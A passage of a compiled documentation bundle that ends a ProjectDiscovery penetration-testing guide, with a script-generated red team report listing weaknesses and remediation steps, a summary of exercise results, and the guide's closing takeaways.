exfiltration\n- \u2705 Endpoint protection preventing USB usage\n- \u2705 Security awareness program in place\n\n### Weaknesses  \n- \u274c Email security controls insufficient\n- \u274c Patch management inconsistent\n- \u274c Excessive administrative privileges\n- \u274c Inadequate access controls on classified data\n- \u274c Limited security monitoring and alerting\n- \u274c Slow incident response capabilities\n\n## Critical Recommendations\n\n### Immediate Actions (0-30 days)\n1. **Patch Critical Vulnerabilities**\n   - Deploy emergency patches for identified CVEs\n   - Prioritize domain controllers and critical servers\n\n2. **Enhance Email Security**\n   - Implement advanced threat protection\n   - Strengthen phishing detection and response\n\n3. **Improve Access Controls**\n   - Review and reduce administrative privileges\n   - Implement least-privilege access model\n   - Secure classified data with proper controls\n\n### Short-term Improvements (30-90 days)\n1. **Security Monitoring Enhancement**\n   - Deploy SIEM with behavioral analytics\n   - Implement network traffic monitoring\n   - Enhance endpoint detection and response\n\n2. **Incident Response**\n   - Update incident response procedures\n   - Conduct tabletop exercises\n   - Improve detection and response times\n\n3. **Security Architecture**\n   - Implement zero-trust network principles\n   - Enhance network segmentation\n   - Deploy additional security controls\n\n### Long-term Strategy (90+ days)\n1. **Continuous Improvement**\n   - Regular red team exercises\n   - Ongoing security assessments\n   - Security maturity development\n\n2. **Compliance and Governance**\n   - NIST Cybersecurity Framework alignment\n   - Regular compliance assessments\n   - Security governance improvements\n\n## Conclusion\n\nThe red team exercise revealed significant security gaps that could be exploited by sophisticated adversaries. While some defensive controls are effective, critical vulnerabilities in email security, patch management, and access controls pose substantial risks to classified information and mission-critical systems.\n\n**Immediate action is required** to address identified vulnerabilities and strengthen the organization\'s security posture before handling higher classification levels.\n\n---\n\n**Classification:** CONFIDENTIAL  \n**Distribution:** Security Leadership, IT Management, Compliance Team  \n**Next Review:** 90 days post-remediation\nEOF\n\necho "\u2705 Red Team Exercise complete"\necho "\ud83d\udcca Report: $RESULTS_DIR/reporting/red_team_report.md"\necho "\ud83d\udd34 Risk Level: HIGH - Immediate remediation required"\n'})}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Results:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Achieved initial access within 2 hours via phishing"}),"\n",(0,i.jsx)(n.li,{children:"Escalated to domain administrator privileges within 24 hours"}),"\n",(0,i.jsx)(n.li,{children:"Accessed classified documents on unsecured file shares"}),"\n",(0,i.jsx)(n.li,{children:"Exfiltrated simulated data via multiple channels"}),"\n",(0,i.jsx)(n.li,{children:"Remained undetected for 72+ hours"}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:(0,i.jsx)(n.strong,{children:"Business Impact:"})}),"\n",(0,i.jsxs)(n.ul,{children:["\n",(0,i.jsx)(n.li,{children:"Identified critical security gaps before classified contract award"}),"\n",(0,i.jsx)(n.li,{children:"Prevented potential $100M+ contract loss due to security failures"}),"\n",(0,i.jsx)(n.li,{children:"Achieved required security certifications within 6 months"}),"\n",(0,i.jsx)(n.li,{children:"Strengthened security posture for future government contracts"}),"\n"]}),"\n",(0,i.jsx)(n.hr,{}),"\n",(0,i.jsx)(n.h2,{id:"conclusion",children:"Conclusion"}),"\n",(0,i.jsx)(n.p,{children:"This comprehensive guide demonstrates the power and versatility of ProjectDiscovery's security toolkit. By combining multiple tools in structured workflows and following established penetration testing methodologies, security professionals can achieve thorough assessments that provide real value to organizations."}),"\n",(0,i.jsx)(n.h3,{id:"key-takeaways",children:"Key Takeaways"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Tool Integration"}),": Maximum effectiveness comes from combining multiple tools in structured pipelines"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Methodology Matters"}),": Following established frameworks (OSSTMM, NIST, PTES) ensures comprehensive coverage"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Automation Scaling"}),": Automated workflows enable continuous monitoring and assessment at scale"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Real-World Application"}),": Practical scenarios demonstrate how tools solve actual business problems"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Risk-Based Approach"}),": Focus on findings that have real business impact and support decision-making"]}),"\n"]}),"\n",(0,i.jsx)(n.h3,{id:"next-steps",children:"Next Steps"}),"\n",(0,i.jsxs)(n.ol,{children:["\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Practice"}),": Start with individual tools and gradually build complex workflows"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Customize"}),": Adapt examples to your specific environment and requirements"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Automate"}),": Implement continuous monitoring pipelines for ongoing security"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Contribute"}),": Share your findings and improvements with the security community"]}),"\n",(0,i.jsxs)(n.li,{children:[(0,i.jsx)(n.strong,{children:"Stay Updated"}),": Keep tools and templates current with regular updates"]}),"\n"]}),"\n",(0,i.jsx)(n.p,{children:"The security landscape evolves constantly, and ProjectDiscovery's toolkit evolves with it. This guide provides the foundation for mastering these tools, but continuous learning and adaptation are essential for staying ahead of emerging threats."}),"\n",(0,i.jsx)(n.p,{children:"Remember: Tools are only as effective as the methodology behind them and the expertise of the person wielding them. Use this guide as a foundation, but always apply critical thinking and adapt approaches based on your specific context and objectives."})]})}function h(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,i.jsx)(n,{...e,children:(0,i.jsx)(d,{...e})}):d(e)}}}]);